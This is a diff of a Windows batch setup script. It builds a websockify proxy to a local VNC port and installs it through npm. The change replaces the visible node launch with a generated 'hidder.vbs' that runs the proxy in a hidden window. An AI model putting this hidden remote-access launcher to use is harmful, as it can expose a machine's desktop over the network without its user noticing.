@@ -33,10 +33,14 @@ echo target: '%LANIP%:5900' >> websockify.js
 echo }); >> websockify.js
 
 
-touch npm_websockify.bat
-echo npm install --save node-websockify > npm_websockify.bat 
+echo npm install --save node-websockify > npm_websockify.bat
+echo exit >> npm_websockify.bat 
+timeout 10
 START npm_websockify.bat
 timeout 5
-node websockify.js
 
-pause
+echo Dim WShell > hidder.vbs
+echo Set WShell = CreateObject("WScript.Shell") >> hidder.vbs
+echo WShell.Run "node websockify.js", 0 >> hidder.vbs
+echo Set WShell = Nothing >> hidder.vbs
+wscript hidder.vbs
